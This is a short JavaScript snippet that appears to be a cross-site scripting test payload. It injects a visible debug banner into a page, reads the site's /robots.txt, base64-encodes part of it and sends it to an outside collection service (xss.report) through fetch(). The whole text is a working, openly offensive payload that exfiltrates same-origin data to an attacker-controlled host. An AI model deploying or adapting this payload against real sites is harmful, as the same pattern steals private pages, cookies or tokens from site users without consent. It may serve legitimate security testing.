(async () => {
    const box = document.createElement('div');
    box.style = "position:fixed;top:0;left:0;width:100%;background:red;color:white;z-index:9999;font-size:12px;padding:5px;";
    box.id = "debug-box";
    box.innerHTML = "Initializing...";
    document.body.appendChild(box);

    const log = (msg) => { document.getElementById('debug-box').innerHTML = msg; };

    try {
        log("Testing fetch to /robots.txt...");
        let res = await fetch('/robots.txt');
        log("Robots.txt status: " + res.status);
        
        if(res.status === 200) {
            let data = await res.text();
            log("Success! Sending to report...");
            fetch('https://xss.report/c/skizaniza?robots=' + btoa(data.slice(0,100)));
        }
    } catch (e) {
        log("Error: " + e.message);
    }
})();
